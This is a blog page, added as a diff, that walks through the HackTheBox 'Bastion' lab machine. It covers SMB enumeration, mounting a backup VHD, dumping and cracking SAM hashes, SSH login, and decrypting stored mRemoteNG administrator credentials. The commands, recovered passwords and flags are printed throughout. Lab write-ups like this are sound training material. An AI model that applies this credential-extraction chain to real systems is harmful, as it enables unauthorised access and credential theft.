@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackTheBox — Bastion | jessefmoore</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+
+<header class="site-header">
+<pre class="ascii-logo">     ██╗███████╗███╗   ███╗
+     ██║██╔════╝████╗ ████║
+     ██║█████╗  ██╔████╔██║
+██   ██║██╔══╝  ██║╚██╔╝██║
+╚█████╔╝██║     ██║ ╚═╝ ██║
+ ╚════╝ ╚═╝     ╚═╝     ╚═╝</pre>
+<div class="tagline">Security Advisor | jessefmoore on LinkedIn, X, and GitHub</div>
+</header>
+
+<div class="wrapper">
+
+<aside class="sidebar">
+  <div class="sidebar-label">navigation</div>
+  <nav>
+    <ul>
+      <li><a href="/index.html">~/ home</a></li>
+      <li><a href="/posts/" class="active">~/posts/</a></li>
+      <li><a href="/reports/">~/reports/</a></li>
+    </ul>
+  </nav>
+  <hr class="sidebar-divider">
+  <div class="sidebar-label">on this page</div>
+  <nav>
+    <ul>
+      <li><a href="#recon" style="font-size:12px">Recon</a></li>
+      <li><a href="#smb" style="font-size:12px">SMB Enumeration</a></li>
+      <li><a href="#vhd" style="font-size:12px">VHD Mount</a></li>
+      <li><a href="#hashes" style="font-size:12px">Hash Extraction</a></li>
+      <li><a href="#foothold" style="font-size:12px">Foothold</a></li>
+      <li><a href="#privesc" style="font-size:12px">Privesc</a></li>
+    </ul>
+  </nav>
+</aside>
+
+<main class="content">
+
+  <div class="breadcrumb"><span class="prompt">jfm@kali</span>:<span class="path">~/posts/2020-02-07</span>$</div>
+
+  <h1>HackTheBox — Bastion</h1>
+
+  <p style="color:var(--muted);font-size:12px;margin-bottom:1.5rem">
+    2020-02-07 &nbsp;·&nbsp;
+    <span style="color:var(--cyan)">HTB</span> &nbsp;
+    <span style="color:var(--cyan)">Windows</span>
+  </p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198097-7183d13b-8e54-4aa9-adb7-84f9131e7638.jpg" alt="Bastion machine info" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Target: <code>10.10.10.134</code></p>
+
+  <hr>
+
+  <h2 id="recon">Recon</h2>
+
+  <pre><code>nmap -sV -sC -oA nmap/Bastion 10.10.10.134</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198195-03df5cfb-eefc-49d6-8208-81a563e6eac8.png" alt="nmap output" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <hr>
+
+  <h2 id="smb">SMB Enumeration</h2>
+
+  <p>Scan for open SMB shares anonymously:</p>
+
+  <pre><code>smbclient --list //bastion.htb/ -U ''</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198311-2555d8f0-69fa-4006-8a47-f6c6139e314d.png" alt="smb shares" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p><code>Backups</code> is the only accessible share. Connect and browse:</p>
+
+  <pre><code>smbclient //10.10.10.134/Backups -U ''</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198373-b6015259-46cb-4241-864b-64244065d0e9.png" alt="backups share" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198460-b3df6a92-9861-429a-aa96-a5d9c00f6f25.png" alt="vhd files" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>VHD files found in the Backup directory.</p>
+
+  <hr>
+
+  <h2 id="vhd">Mount the VHD</h2>
+
+  <p>Mount the SMB share locally, then use <code>guestmount</code> to mount the VHD:</p>
+
+  <pre><code># Mount the SMB share
+mount -t cifs //10.10.10.134/Backups /mnt/smb
+
+# Install guestfs tools if needed
+apt install libguestfs-tools
+
+# Mount the VHD
+mkdir /mnt/vhd2
+guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd2</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198657-2ec6290a-68be-4831-aa27-70acd39f3c78.png" alt="guestmount" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Browse the mounted VHD and navigate to the Windows System32/config directory:</p>
+
+  <pre><code>find Desktop Documents/ Downloads/ -ls</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198699-5d565314-ee5e-49df-b337-8b9110697e44.png" alt="files found" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <hr>
+
+  <h2 id="hashes">Extract SAM Hashes</h2>
+
+  <p>Copy SAM and SYSTEM hives from the VHD:</p>
+
+  <pre><code>cp SAM SYSTEM /root/htb/bastion
+cd /root/htb/bastion
+mkdir backup-dump
+mv SAM SYSTEM backup-dump/
+cd backup-dump/
+
+impacket-secretsdump -sam SAM -system SYSTEM local</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198813-2e9837fa-f727-4ce5-9ee5-b6286624260b.png" alt="secretsdump" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</code></pre>
+
+  <p>Administrator NT hash is blank (<code>31d6c...</code>) — account is disabled. Crack L4mpje's hash:</p>
+
+  <pre><code># CrackStation or hashcat
+hashcat -m 1000 26112010952d963c8dc4217daec986d9 rockyou.txt</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198862-1bea1925-8c17-4920-9355-8133d76faf05.png" alt="crackstation result" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Result: <code>bureaulampje</code></p>
+
+  <hr>
+
+  <h2 id="foothold">Foothold — SSH</h2>
+
+  <pre><code>ssh L4mpje@10.10.10.134
+# password: bureaulampje</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169198890-39ffc99e-ddef-4213-9285-d815d93f33fa.png" alt="ssh shell" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <pre><code>type C:\Users\L4mpje\Desktop\user.txt</code></pre>
+
+  <p>User flag: <code>9bfe57d5c3309db3a151772f9d86c6cd</code></p>
+
+  <hr>
+
+  <h2 id="privesc">Privesc — mRemoteNG Credential Extraction</h2>
+
+  <p>JAWS enumeration reveals <code>mRemoteNG</code> installed — known to store credentials insecurely in <code>confCons.xml</code>.</p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169199027-94265486-0687-408d-aa88-507f0d5c1892.png" alt="jaws mremoteng" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <pre><code># Download confCons.xml from target
+scp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169199111-b7d8cb29-b75e-4e5a-a50a-5a67b2eddd3e.png" alt="confcons.xml" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>File contains encrypted Administrator RDP credentials. Use <a href="https://github.com/kmahyyg/mremoteng-decrypt" target="_blank">mremoteng-decrypt</a> to crack them:</p>
+
+  <pre><code>cat confCons.xml | grep Password</code></pre>
+
+  <pre><code>python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+# Password: thXLHM96BeKL0ER2</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169199194-431f5a5a-641c-4d05-9d82-ac4d704e2476.png" alt="decrypt result" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <pre><code>ssh administrator@10.10.10.134
+# password: thXLHM96BeKL0ER2</code></pre>
+
+  <pre><code>administrator@BASTION C:\Users\Administrator\Desktop>type root.txt</code></pre>
+
+  <p>Root flag: <code>958850b91811676ed6620a9c430e65c8</code></p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/169199226-f131b09f-a0a0-4e49-9a17-cc31144146f8.png" alt="root flag" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <hr>
+
+  <p style="margin-top:2rem"><a href="/posts/">← Back to posts</a></p>
+
+</main>
+</div>
+
+</body>
+</html>
